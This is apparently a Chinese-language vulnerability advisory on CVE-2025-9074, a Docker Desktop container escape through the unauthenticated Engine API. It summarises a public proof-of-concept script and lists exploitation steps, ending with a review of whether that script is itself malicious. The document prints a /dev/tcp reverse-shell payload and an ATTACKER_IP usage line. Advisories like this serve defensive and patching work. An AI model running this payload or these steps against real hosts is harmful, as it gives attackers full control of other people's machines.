## CVE-2025-9074 - Docker Desktop Container Escape / Unauthenticated Remote Code Execution

**漏洞编号:** CVE-2025-9074

**漏洞类型:** Container Escape / Unauthenticated Remote Code Execution

**影响应用:** Docker Desktop

**危害等级:** High Risk / Critical

**CVSS评分:** 9.3

**影响版本:** Docker Desktop for Windows and macOS versions prior to 4.44.3 (fixed on 2025-08-20)

**利用条件:** Requires a locally running malicious Linux container on the host system (Windows/macOS Docker Desktop installation). No authentication is required to interact with the Docker Engine API once network access is established from the container. Does not require Docker socket mounts or explicit 'expose daemon' settings.

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

CVE-2025-9074 漏洞描述: 该漏洞存在于Docker Desktop的Windows和macOS版本中。它允许在受影响系统上本地运行的恶意Linux容器绕过标准的隔离机制，直接访问宿主机上的Docker Engine API。具体而言，该漏洞利用了Docker Desktop默认子网（通常是192.168.65.7:2375）上的API接口在未经验证的情况下可从容器内部访问的问题。这使得攻击者即使在没有显式挂载Docker socket或启用“Expose daemon on tcp://localhost:2375”设置的情况下，也能通过已有的恶意容器获得对宿主机的控制权。该漏洞被评为高危，CVSS评分为9.3，可能导致容器逃逸并实现远程代码执行（RCE），从而完全控制受感染的宿主机。

POC有效性分析: 提供的POC是一个名为exploit.sh的Bash脚本，它是一个功能完整、无需额外依赖的独立利用工具。脚本通过curl命令直接与未经验证的Docker Engine API（默认为192.168.65.7:2375）进行交互。它首先尝试获取可用的Docker镜像，然后利用该镜像创建一个新的特权容器。此特权容器通过HostConfig中的Binds选项将宿主机的根目录（MOUNT变量，默认为/）挂载到容器的/host路径。此外，它将Privileged设置为true并使用NetworkMode: host。最关键的是，容器的Cmd参数被设置为执行chroot /host /bin/sh -c 'sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1'，这将在宿主机的文件系统上下文中执行一个反向shell，连接到攻击者指定的LHOST和LPORT。脚本自动化了容器的创建和启动过程。经过分析，该POC代码逻辑清晰，利用了漏洞的核心机制，即未经验证的API访问和特权容器的创建能力，预期能够成功实现容器逃逸和远程代码执行。

利用步骤:
1. 准备恶意容器: 攻击者需要在受影响的Docker Desktop主机上部署一个恶意的Linux容器。该容器不需要特殊的配置或权限，因为它将利用宿主机API的漏洞。
2. 执行POC脚本: 在恶意容器内部，执行提供的exploit.sh脚本。
3. 指定监听地址: 攻击者需要提供一个外部监听服务器的IP地址（LHOST）和端口（LPORT），以便接收反向shell。例如：./exploit.sh -l ATTACKER_IP -p ATTACKER_PORT。
4. 自动化利用: 脚本将自动完成以下步骤：
   * 探测并选择一个可用的Docker镜像。
   * 向宿主机Docker Engine API发送POST /containers/create请求，创建一个新的特权容器。此容器将宿主机的根文件系统挂载到容器内部的/host目录，并配置为在启动时执行反向shell命令。
   * 向宿主机Docker Engine API发送POST /containers/$CID/start请求，启动新创建的容器。
5. 获取反向Shell: 一旦新容器启动，反向shell将被执行，连接到攻击者的监听服务器，从而授予攻击者对宿主机的完全控制权。攻击者可以在宿主机文件系统上执行任意命令。

投毒风险分析:
本POC代码（exploit.sh）经过仔细审查，其投毒风险评估为低（5%）。具体分析如下：
*   代码清晰度与可读性: 脚本代码结构清晰，使用Bash编写，逻辑直观，无任何混淆或加密操作。所有命令及其作用都一目了然。
*   外部依赖: 脚本声明“Zero Dependencies”，实际运行时仅依赖于curl、grep、cut、tr等标准Linux系统工具，这些工具在大多数Linux环境中普遍存在，且其行为是可预测的。脚本没有尝试从外部URL下载或执行任何二进制文件、脚本或库。
*   可疑行为检测: 脚本的核心功能是向192.168.65.7:2375发送HTTP请求以操作Docker API。这是漏洞利用的合法组成部分，而非恶意行为。脚本中包含的反向shell命令chroot /host /bin/sh -c 'sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1'是典型的攻击载荷，它旨在建立与攻击者控制的LHOST和LPORT的反向连接。需要强调的是，这是一个攻击载荷，而不是POC代码本身的投毒行为。POC的功能就是为了证明这种攻击载荷能够被成功执行。
*   权限滥用: POC利用了漏洞来提升容器权限并访问宿主机文件系统，这是预期的漏洞利用行为，并非POC自身对执行环境的额外恶意破坏。
*   总结: 脚本严格遵循其“概念验证”和“利用”的宗旨，专注于展示漏洞的利用过程，不包含额外的、与漏洞利用目的无关的恶意代码或隐藏功能。因此，该POC代码本身不构成投毒风险，只要用户理解其作为攻击工具的本质并负责任地使用。

**项目地址:** https://github.com/zenzue/CVE-2025-9074

**漏洞详情:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-9074
